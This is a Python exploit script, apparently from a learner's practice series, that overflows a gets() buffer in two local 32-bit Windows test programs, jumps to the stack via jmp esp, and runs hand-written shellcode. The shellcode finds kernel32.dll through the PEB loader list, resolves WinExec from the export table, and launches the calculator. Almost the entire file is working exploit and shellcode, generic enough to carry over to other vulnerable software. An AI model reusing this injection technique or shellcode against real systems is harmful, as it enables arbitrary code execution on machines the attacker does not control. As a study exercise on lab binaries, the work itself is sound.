# 7th exploit: buffer overflow + jump to stack + open the calculator, but KERNEL32.DLL's addr is not fetched outside

import sys

from pwintools import *

# 64 bit has non-executable stack
processes = [
	Process('2_gets_bs_gcc_32.exe'),
	Process('2_gets_bs_vs_32.exe'),
]

retAddrOffs = [
	48,
	40,
]

# jmp esp
jmpEspAddr = [
	0x401712,
	0x4070CA,
]

injection = asm(
	# fetch loaded DLL list
	'mov eax, fs:[0x30];' # PEB pointer inside TEB
	'mov eax, [eax + 0xc];' # PEB_LDR_DATA *Ldr
	# TODO which list to use?
	'mov ebx, [eax + 0x14];' # (LIST_ENTRY InMemoryOrderModuleList).forwardLink
	'sub ebx, 8;' # TODO explain

	# setup string comparison:
	'call dummy123;'
	'.asciz "K";' # TODO how to define a wstring in keystone?? (-> in llvm?)
	'.asciz "E";'
	'.asciz "R";'
	'.asciz "N";'
	'.asciz "E";'
	'.asciz "L";'
	'.asciz "3";'
	'.asciz "2";'
	'.asciz ".";'
	'.asciz "D";'
	'.asciz "L";'
	'.asciz "L";'
	'.short 0;'
	'.byte 0;' # pad so strlen != 0x1a
	'dummy123:'
	'pop edx;'

	# search for kernel32.dll
	'lookForKernel32:'
	#'mov ebp, [ebx + 0x28];' # UNICODE_STRING FullDllName
	'mov esi, [ebx + 0x30];' # UNICODE_STRING BaseDllName
	'mov edi, edx;'
	'mov ecx, 12;' # strlen("KERNEL32.DLL") + 1
	'inc ecx;' # 13 is forbidden

	# strncmp for wstring
	'repe cmpsw;'

	'je foundKernel;'

	# prepare for next iteration
	'mov ebx, [ebx + 0x08];' # (LIST_ENTRY InMemoryOrderLinks).forwardLink
	'test ebx, ebx;'
	'jz die;'
	'sub ebx, 8;' # TODO explain
	'jmp lookForKernel32;'
	'die:'
	'mov [ebx], eax;' # idk what to do

	'foundKernel:'

	'mov eax, [ebx + 0x18];' # DllBase
	
	# parse kernel32.dll's PE header to find WinExec
	'mov [esp], eax;' # save base
	#'mov ebx, eax;'
	'add eax, [eax + 0x3c];' # offset of PE signature
	'lea esi, [eax + 4];' # COFF file header
	#'movzx edx, word ptr [ecx + 2];' # number of sections
	'lea edi, [esi + 20];' # optional header is after the COFF file header
	'movzx eax, word ptr [edi + 0];' # magic (PE32 or PE32+)
	'mov ecx, 112;' # offset in PE32+
	'cmp eax, 0x10b;' # PE32
	'mov eax, 96;' # offset in PE32
	'cmove ecx, eax;' 
	'mov eax, [edi + ecx + 0];' # export directory table
	'add eax, [esp];' # rva to va
	'mov [esp + 4], eax;' # save it

	# set up binary search to look for VirtualAlloc

	'call pusharg123;'
	#'.asciz "VirtualAlloc";' # strlen+null is 13
	#'.byte 0;' # 13 is forbidden (the call would have 13 as arg)
	'.asciz "WinExec";' # strlen+null is 8
	'pusharg123:'
	#'pop [esp + 4 + 4];' # for strcmp
	'pop edi;' # for strcmp
	#'mov ebx, [eax + 28];' # export address table
	'mov ebx, [eax + 32];' # name pointer table
	'add ebx, [esp];' # rva to va
	#'mov edi, [eax + 36];' # ordnal table
	'mov edx, [eax + 24];' # num of named exported functions
	'inc edx;' # higher idx for binary search: needle < name[edx]
	'xor ebp, ebp;'
	'dec ebp;' # lower idx for binary search: name[ebp] < needle
	
	'binary_search:'
	# termination condition: high - low < 2
	'mov eax, edx;'
	'sub eax, ebp;'
	'cmp eax, 2;'
	'jb not_found;' # well
	# ~ i = (low + high) / 2
	'mov eax, ebp;'
	'add eax, edx;'
	'shr eax, 1;'
	# check relation between name[i] and needle (in this order)
	'mov ecx, 8;' # strlen + null
	'mov esi, [ebx + eax * 4];' # fetch next function to compare
	'add esi, [esp];' # rva to va
	'repe cmpsb;' # strncmp
	'lea edi, [edi + ecx - 8];' # reset edi pointer
	'je found_eax;' # if equal, gg
	# if "b", then esi < edi, then name[i] < needle, then lower = i
	'jb upper_half;'
	# else higher = i
	'mov edx, eax;'
	'jmp binary_search;'
	'upper_half:'
	'mov ebp, eax;'
	'jmp binary_search;'

	'not_found:'
	'jmp 0xDEADC0DE;' # die
	# 'found_ebp:'
	# 'mov eax, ebp'
	'found_eax:'
	'found:'
	'mov edx, [esp];' # image base
	'mov ebx, [esp + 4];' # export directory table
	'mov ecx, [ebx + 36];' # ordinal table
	'add ecx, edx;' # rva to va
	'movzx eax, word ptr [ecx + eax * 2];' # index inside export address table
	'mov ecx, [ebx + 28];' # export address table
	'add ecx, edx;' # rva to va
	'mov eax, [ecx + eax * 4];' # needle's rva
	'add eax, edx;' # rva to va

	# WinExec(calc, SW_NORMAL)
	'push dword 1;' # SW_NORMAL
	'call arg;'
	'.asciz "C:/WINDOWS/system32/calc";'
	'arg:'
	#'add eax, 0x5dcf0;' # WinExec
	'call eax;'

	'int3;'
	# TODO normal exit?

	'label456:',
	32
)

for b in injection:
	if b > 16:
		x = hex(b)[2:]
	else:
		x = '0' + hex(b)[2:]
	print(x, end='')
print()

for b in injection:
	if 0x0d == b or 0x0a == b or 0x1a == b: # TODO what tf is 0x1a??
		print('Error: assembly contains ' + str(b))
		sys.exit()

for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	print(b'Injecting ' + injection)
	processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection) # + b'tmp' + str(i).encode('ascii') + b'\0')
	print(processes[i].recvall())

# processes[1].set_timeout(3600000) # to have time to interact with the debugger
# input('Press enter after attaching the debugger')

# i = 1
# processes[i].recvuntil(b'name:\r\n')
# processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection) # + b'tmp' + str(i).encode('ascii') + b'\0')
# processes[i].interactive()
#print(processes[i].recvall())